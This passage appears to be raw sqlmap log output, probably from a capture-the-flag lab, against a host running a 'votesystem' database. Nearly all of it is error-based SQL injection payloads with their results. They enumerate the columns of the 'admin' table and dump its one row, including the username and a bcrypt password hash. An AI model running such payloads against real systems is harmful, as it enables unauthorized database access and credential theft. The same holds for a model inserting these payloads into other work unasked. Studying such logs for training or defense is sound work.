+[15:09:49] [PAYLOAD] test' OR (SELECT 4676 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 3,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mcUk
+[15:09:50] [INFO] retrieved: 'id'
+[15:09:50] [PAYLOAD] test' OR (SELECT 8324 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 0,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ZZwd
+[15:09:51] [INFO] retrieved: 'created_on'
+[15:09:51] [PAYLOAD] test' OR (SELECT 7210 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 6,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- GJeC
+[15:09:51] [INFO] retrieved: 'username'
+[15:09:51] [INFO] retrieved: 'lastname'
+[15:09:51] [INFO] retrieved: 'password'
+[15:09:51] [PAYLOAD] test' OR (SELECT 6666 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 1,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Slzl
+[15:09:51] [PAYLOAD] test' OR (SELECT 1418 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 4,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mMca
+[15:09:51] [PAYLOAD] test' OR (SELECT 9262 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 2,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YQCb
+[15:09:51] [INFO] retrieved: 'firstname'
+[15:09:51] [INFO] retrieved: 'photo'
+[15:09:51] [PAYLOAD] test' OR (SELECT 5704 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 3,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tnqB
+[15:09:51] [INFO] retrieved: 'int(11)'
+[15:09:51] [PAYLOAD] test' OR (SELECT 3338 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 5,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lwYA
+[15:09:52] [INFO] retrieved: 'date'
+[15:09:52] [INFO] retrieved: 'varchar(50)'
+[15:09:52] [INFO] retrieved: 'varchar(50)'
+[15:09:52] [INFO] retrieved: 'varchar(50)'
+[15:09:53] [INFO] retrieved: 'varchar(60)'
+[15:09:53] [INFO] retrieved: 'varchar(150)'
+[15:09:53] [DEBUG] performed 15 queries in 4.87 seconds
+[15:09:53] [INFO] fetching entries for table 'admin' in database 'votesystem'
+[15:09:53] [PAYLOAD] test' OR (SELECT 8591 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM votesystem.`admin`),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hJmB
+[15:09:54] [DEBUG] used SQL query returns 1 entry
+[15:09:54] [PAYLOAD] test' OR (SELECT 1168 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(created_on AS NCHAR),0x20)),1,51) FROM votesystem.`admin` ORDER BY id),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FIpl
+[15:09:56] [INFO] retrieved: '2018-04-02'
+[15:09:56] [PAYLOAD] test' OR (SELECT 2815 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(firstname AS NCHAR),0x20)),1,51) FROM votesystem.`admin` ORDER BY id),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lPVg
+[15:09:57] [INFO] retrieved: 'Neovic'
+[15:09:57] [PAYLOAD] test' OR (SELECT 6761 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(id AS NCHAR),0x20)),1,51) FROM votesystem.`admin` ORDER BY id),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- GBAO
+[15:09:59] [INFO] retrieved: '1'
+[15:09:59] [PAYLOAD] test' OR (SELECT 8120 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(lastname AS NCHAR),0x20)),1,51) FROM votesystem.`admin` ORDER BY id),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IfLD
+[15:10:01] [DEBUG] turning off reflection removal mechanism (for optimization purposes)
+[15:10:01] [INFO] retrieved: 'Devierte'
+[15:10:01] [PAYLOAD] test' OR (SELECT 3354 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(password AS NCHAR),0x20)),1,51) FROM votesystem.`admin` ORDER BY id),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ZRCs
+[15:10:02] [PAYLOAD] test' OR (SELECT 6945 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(password AS NCHAR),0x20)),52,51) FROM votesystem.`admin` ORDER BY id),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- GMZv
+[15:10:03] [INFO] retrieved: '$2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n9...
+[15:10:03] [PAYLOAD] test' OR (SELECT 7926 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(photo AS NCHAR),0x20)),1,51) FROM votesystem.`admin` ORDER BY id),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dfxj
+[15:10:04] [INFO] retrieved: 'facebook-profile-image.jpeg'
+[15:10:04] [PAYLOAD] test' OR (SELECT 2123 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(username AS NCHAR),0x20)),1,51) FROM votesystem.`admin` ORDER BY id),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qUfM
+[15:10:06] [INFO] retrieved: 'admin'
+[15:10:06] [DEBUG] performed 9 queries in 12.85 seconds
+[15:10:06] [DEBUG] analyzing table dump for possible password hashes
+Database: votesystem
+Table: admin
+[1 entry]
++----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+
+| id | photo                       | lastname | password                                                     | username | firstname | created_on |
++----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+
+| 1  | facebook-profile-image.jpeg | Devierte | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | admin    | Neovic    | 2018-04-02 |
++----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+
+
+[15:10:06] [INFO] table 'votesystem.`admin`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.10.239/dump/votesystem/admin.csv'            
+[15:10:06] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.239'                                            
+
+[*] ending @ 15:10:06 /2025-03-20/
